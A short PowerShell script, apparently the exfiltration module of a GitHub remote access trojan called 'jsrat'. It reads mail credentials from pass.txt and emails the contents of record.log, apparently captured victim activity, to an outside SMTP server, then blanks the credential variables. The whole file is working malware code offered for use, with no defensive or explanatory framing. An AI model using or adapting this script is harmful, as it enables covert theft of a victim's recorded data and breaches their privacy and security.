# This file sends the email to the server
# This should work with gmail
# Coded by @J-P-S-O (https://github.com/J-P-S-O/jsrat)
$file_data = Get-Content pass.txt
$EmailFrom = $file_data[2]
$EmailTo = $file_data[2]
$Subject = Get-Date
$Body = Get-Content record.log
$SMTPServer = $file_data[3]
$mailusername = $file_data[0]
$mailpassword = $file_data[1]
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, $file_data[4])
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($mailusername, $mailpassword);
$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
$file_data = "whoosh"
$mailusername = "whoosh"
$mailpassword = "whoosh"